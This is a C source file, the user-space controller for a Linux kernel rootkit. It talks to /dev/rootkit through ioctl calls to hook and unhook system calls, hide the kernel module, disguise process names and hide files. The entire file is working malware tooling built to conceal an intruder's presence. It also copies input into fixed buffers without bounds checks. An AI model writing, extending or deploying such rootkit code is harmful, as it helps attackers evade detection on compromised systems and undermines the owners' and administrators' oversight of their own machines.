#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#include "rootkit.h"

void printUsageAndExit(char* cmd_name);
static inline int openDev(void);

void toggleSysCallHooks(void);
void toggleVisibility(void);
void masqProcNames(int len);
void hideFile(char* file_name);

int main(int argc, char* argv[]) {
    int opt, len;

    if (argc <= 1) printUsageAndExit(argv[0]);

    while ((opt = getopt(argc, argv, "Hhm:f:")) != -1) {
        switch (opt) {
        case 'H':   // Hook/Unhook system calls
            toggleSysCallHooks();
            break;
        case 'h':   // Hide/Unhide the module
            toggleVisibility();
            break;
        case 'm':   // Masquerade process names
            len = strtol(optarg, NULL, 10);
            masqProcNames(len);
            break;
        case 'f':   // Hide a file
            hideFile(optarg);
            break;
        default:
            printUsageAndExit(argv[0]);
        }
    }

    return 0;
}

void printUsageAndExit(char* cmd_name) {
    const char usage[] = "Usage: %s [OPTION]\n"
        "-H             Hook/unhook system calls\n"
        "-h             Hide/unhide the module\n"
        "-m [LENGTH]    Masquerade process names\n"
        "-f [FILE NAME] Hide a file\n";
    fprintf(stderr, usage, cmd_name);
    exit(1);
}

static inline int openDev(void) {
    return open("/dev/rootkit", O_RDWR);
}

void toggleSysCallHooks(void) {
    int fd = openDev();
    ioctl(fd, IOCTL_MOD_HOOK);
    close(fd);
}

void toggleVisibility(void) {
    int fd = openDev();
    ioctl(fd, IOCTL_MOD_HIDE);
    close(fd);
}

void masqProcNames(int len) {
    struct masq_proc_req req;
    struct masq_proc* procs = malloc(sizeof(struct masq_proc) * len);

    req.len = len;
    for (int i = 0; i < len; i++) {
        printf("%d:\n", i);
        printf("old name = ");
        scanf("%s", procs[i].orig_name);
        printf("new name = ");
        scanf("%s", procs[i].new_name);
    }
    req.list = procs;

    int fd = openDev();
    ioctl(fd, IOCTL_MOD_MASQ, &req);
    close(fd);
    free(procs);
}

void hideFile(char* file_name) {
    struct hided_file req;
    req.len = strlen(file_name);
    strcpy(req.name, file_name);

    int fd = openDev();
    ioctl(fd, IOCTL_FILE_HIDE, &req);
    close(fd);
}
